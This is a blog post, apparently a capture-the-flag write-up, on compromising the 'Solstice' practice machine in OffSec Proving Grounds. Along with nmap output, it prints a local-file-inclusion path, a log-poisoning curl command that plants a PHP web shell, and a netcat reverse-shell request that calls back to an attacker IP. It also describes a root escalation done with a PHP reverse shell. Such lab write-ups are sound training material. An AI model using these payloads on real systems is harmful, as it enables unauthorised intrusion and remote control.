@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<link href="https://fonts.googleapis.com/css?family=Merriweather:300|Raleway:400,700" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/style.css">
+<title>Proving grounds Play: Solstice</title>
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Proving grounds Play: Solstice | Thevillagehacker’s Blog</title>
+<meta name="generator" content="Jekyll v4.3.3" />
+<meta property="og:title" content="Proving grounds Play: Solstice" />
+<meta name="author" content="Naveen" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Offsec proving grounds play linux machine writeup" />
+<meta property="og:description" content="Offsec proving grounds play linux machine writeup" />
+<link rel="canonical" href="http://localhost:4000/2023/09/13/Proving_grounds_Play-Solstice.html" />
+<meta property="og:url" content="http://localhost:4000/2023/09/13/Proving_grounds_Play-Solstice.html" />
+<meta property="og:site_name" content="Thevillagehacker’s Blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-09-13T05:00:00+05:30" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Proving grounds Play: Solstice" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Naveen"},"dateModified":"2023-09-13T05:00:00+05:30","datePublished":"2023-09-13T05:00:00+05:30","description":"Offsec proving grounds play linux machine writeup","headline":"Proving grounds Play: Solstice","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2023/09/13/Proving_grounds_Play-Solstice.html"},"url":"http://localhost:4000/2023/09/13/Proving_grounds_Play-Solstice.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+<script type="text/javascript" src="/assets/js/darkmode.js"></script>
+
+</head><body>
+  <main class="container">
+    <section class="about">
+      <div class="about-header condensed">
+      <div class="about-title">
+      <a href="/">
+        
+        <img src="/assets/portfolio.jpg" alt="Naveen Jagadeesan" />
+        
+      </a>
+      <h2 id="title">
+        <a href="/">Naveen Jagadeesan</a>
+      </h2>
+      </div><p class="tagline">Security Analyst. Security Researcher</p></div>
+      
+      <ul class="social about-footer condensed"><a href="https://github.com/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-github-circled"></i>
+          </li>
+        </a><a href="https://www.linkedin.com/in/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-linkedin-squared"></i>
+          </li>
+        </a><a href="https://twitter.com/thevillagehackr" target="_blank">
+          <li>
+            <i class="icon-twitter-squared"></i>
+          </li>
+        </a></ul><p class="about-footer condensed">&copy;
+        2024</p><div class="about-footer condensed">
+        <p>Dark Mode
+          <i class="icon-moon"></i>
+          <label class="switch">
+            <input type="checkbox" class="dark-mode-toggle">
+            <span class="slider round" onclick="toggleDarkMode()"></span>
+          </label>
+        </p>
+      </div>
+    </section>
+    <section class="content">
+      <div class="post-container">
+  <a class="post-link" href="/2023/09/13/Proving_grounds_Play-Solstice.html">
+    <h2 class="post-title">Proving grounds Play: Solstice</h2>
+  </a>
+  <div class="post-meta">
+    <div class="post-date"><i class="icon-calendar"></i>Sep 13, 2023</div></div>
+  <div class="post">
+    <h2 id="nmap">Nmap</h2>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE SERVICE    VERSION
+21/tcp    open  ftp        pyftpdlib 1.5.6
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|  Connected to: 192.168.180.72:21
+|  Waiting <span class="k">for </span>username.
+|  TYPE: ASCII<span class="p">;</span> STRUcture: File<span class="p">;</span> MODE: Stream
+|  Data connection closed.
+|_End of status.
+22/tcp    open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 5ba737fd556cf8ea03f510bc94320718 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 abda6a6f973fb2703e6c2b4b0cb7f64c <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 ae29d4e346a1b15227838f8fb0c436d1 <span class="o">(</span>ED25519<span class="o">)</span>
+25/tcp    open  smtp       Exim smtpd
+| smtp-commands: solstice Hello nmap.scanme.org <span class="o">[</span>192.168.45.197], SIZE 52428800, 8BITMIME, PIPELINING, CHUNKING, PRDR, HELP
+|_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP
+80/tcp    open  http       Apache httpd 2.4.38 <span class="o">((</span>Debian<span class="o">))</span>
+2121/tcp  open  ftp        pyftpdlib 1.5.6
+3128/tcp  open  http-proxy Squid http proxy 4.6
+8593/tcp  open  http       PHP cli server 5.5 or later <span class="o">(</span>PHP 7.3.14-1<span class="o">)</span>
+54787/tcp open  http       PHP cli server 5.5 or later <span class="o">(</span>PHP 7.3.14-1<span class="o">)</span>
+
+62524/tcp open  tcpwrapped
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+
+<h2 id="web-port--8593">Web PORT : 8593</h2>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/Solstice/web.png" alt="img" /></p>
+
+<h2 id="lfi-vulnerability">LFI Vulnerability</h2>
+
+<p>Clicking on the <code class="language-plaintext highlighter-rouge">Book List</code> button shows the <code class="language-plaintext highlighter-rouge">index.php?book</code> location.</p>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/Solstice/lfi.png" alt="img" /></p>
+
+<h2 id="apache-log-poisoning-attack">Apache Log Poisoning attack</h2>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://192.168.180.72:8593/index.php?book=../../../../../../var/log/apache2/access.log
+</code></pre></div></div>
+
+<p>The LFI vulnerability can be exploited through the log poisoning attack. Send a php code execution payload to the server to store the payload in the log file.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://192.168.180.72 <span class="nt">-A</span> <span class="s2">"&lt;?php system(</span><span class="se">\$</span><span class="s2">_GET['cmd']); ?&gt;"</span>
+</code></pre></div></div>
+
+<p>Execute arbitrary command in the URL to verify the code execution.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://192.168.180.72:8593/index.php?book<span class="o">=</span>../../../../../../var/log/apache2/access.log&amp;cmd<span class="o">=</span><span class="nb">whoami</span>
+</code></pre></div></div>
+
+<p>Execute the below netcat command to obtain reverse shell. Ensure netcat listener is running on the desired PORT for reverse connection.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-s</span> <span class="s2">"http://192.168.180.72:8593/index.php?book=../../../../../../var/log/apache2/access.log&amp;cmd=nc%20192.168.45.197%204444%20-e%20%2Fbin%2Fbash%20"</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/Solstice/shell.png" alt="img" /></p>
+
+<p><strong>Initial Foothold obtained</strong></p>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+
+<h3 id="process-enumeration">Process Enumeration</h3>
+
+<p>Check the running process with root permissions.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ps aux | <span class="nb">grep </span>root
+</code></pre></div></div>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/Solstice/ps.png" alt="img" /></p>
+
+<p>PHP is running as root, in order to get a shell as <code class="language-plaintext highlighter-rouge">root</code> the index.php file located in the <code class="language-plaintext highlighter-rouge">/var/tmp/sv/</code> folder has to be replaced with a php reverse shell.</p>
+
+<p>Download the pentest monkey php reverse shell into the folder and rename it as <code class="language-plaintext highlighter-rouge">index.php</code>. Once the file is downloaded and renamed then run internal curl command to execute the php file to obtain the reverse shell.</p>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/Solstice/root.png" alt="img" /></p>
+
+<p><strong>Root obtained</strong></p>
+
+<p>Thanks for reading!</p>
+
+<p>For more insights and updates, follow me on Twitter: <a href="https://twitter.com/thevillagehackr">@thevillagehacker</a>.</p>
+
+  </div></div>
+
+    </section>
+    <footer class="condensed">
+      <ul class="social about-footer condensed"><a href="https://github.com/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-github-circled"></i>
+          </li>
+        </a><a href="https://www.linkedin.com/in/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-linkedin-squared"></i>
+          </li>
+        </a><a href="https://twitter.com/thevillagehackr" target="_blank">
+          <li>
+            <i class="icon-twitter-squared"></i>
+          </li>
+        </a></ul><p class="about-footer condensed">&copy;
+        2024</p><div class="about-footer condensed">
+        <p>Dark Mode
+          <i class="icon-moon"></i>
+          <label class="switch">
+            <input type="checkbox" class="dark-mode-toggle">
+            <span class="slider round" onclick="toggleDarkMode()"></span>
+          </label>
+        </p>
+      </div>
+    </footer>
+  </main>
+  
+  <script type="text/javascript" src="/assets/js/darkmode.js"></script>
+  
+  <script src="/assets/js/simple-jekyll-search.min.js"></script>
+  <script src="/assets/js/search.js"></script>
+  
+</body>
+
+</html>
